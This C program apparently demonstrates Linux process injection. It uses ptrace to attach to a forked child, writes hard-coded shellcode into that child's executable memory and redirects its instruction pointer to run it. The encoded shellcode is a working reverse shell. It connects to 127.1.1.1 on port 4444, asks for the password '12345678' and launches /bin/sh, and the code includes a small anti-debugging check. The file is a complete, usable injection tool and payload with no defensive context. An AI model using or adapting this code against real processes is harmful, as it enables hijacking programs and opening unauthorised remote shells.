#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdint.h>
#include "log/log.h"

const char *SHELLCODE = "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";

int hPokeText(pid_t pid, size_t addr, char *buf, size_t buf_len);
void inject(pid_t pid);

int hPokeText(pid_t pid, size_t addr, char *buf, size_t buf_len) {
    for (size_t i = 0; i < buf_len; i += sizeof(uint64_t)) {
        uint64_t value = *(uint64_t *)(buf + i);
        if (ptrace(PTRACE_POKEDATA, pid, addr + i, (void *)value) < 0) {
            log_error("[!] Failed to write data to process memory.");
            exit(EXIT_FAILURE);
        }
    }
    return 0;
}

void inject(pid_t pid) {
    struct user_regs_struct old_regs, regs;
    long                            address;
    size_t        psize = strlen(SHELLCODE);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        log_error("[!] Failed to attach to process.");
        exit(EXIT_FAILURE);
    }

    wait(NULL);

    if (ptrace(PTRACE_GETREGS, pid, NULL, &old_regs) < 0) {
        log_error("[!] Failed to get state from registers.");
        exit(EXIT_FAILURE);
    }
    
    char maps[20];
    snprintf(maps, sizeof(maps), "/proc/%d/maps", pid);
    FILE *file_maps = fopen(maps, "r");
    if (!file_maps) {
        log_error("[!] Failed to open maps file.");
        exit(EXIT_FAILURE);
    }

    char line[256];
    while (fgets(line, sizeof(line), file_maps)) {
        if (strstr(line, "r-xp") != NULL) {
            address = strtol(strtok(line, "-"), NULL, 16);
            break;
        }
    }
    fclose(file_maps);

    if (address == 0) {
        log_error("[!] Failed to find a suitable memory region for injection.\n");
        exit(EXIT_FAILURE);
    }
    log_info("[*] Found suitable memory region at %ld\n", address);
    
    hPokeText(pid, address, SHELLCODE, psize);

    memcpy(&regs, &old_regs, sizeof(struct user_regs_struct));
    regs.rip = address;

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        log_error("[!] Failed to set registers state.");
        exit(EXIT_FAILURE);
    }

    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
        log_error("[!] Failed to detach from process.");
        exit(EXIT_FAILURE);
    }

    log_info("[*] Injected!!\n");
}

int main() {
    pid_t pid = fork();
    if (pid < 0) {
        log_error("[!] fork() fail");
        exit(1);
    } else if (pid == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1)
        {
            exit(EXIT_FAILURE); // Silly anti-debugging
        }
        log_debug("[D] [CHILD]: In [CHILD] proc with PID: %i\n", pid);
        
        pid_t cpid = setsid();
        if (cpid < 0) {
            log_error("[!] setsid() fail\n");
            exit(1);
        } 
        
        log_info("[*] [CHILD]: Dettached from [PARENT]\n");
        log_info("[*] [CHILD]: Entering sleep\n");
        
        while (1) {
            sleep(1);
            log_debug("[D] [CHILD]: Sleeping\n");
        }

    } else {
        log_info("[*] [PARENT]: Starting injection\n");
        inject(pid);
    }
    return 0;
}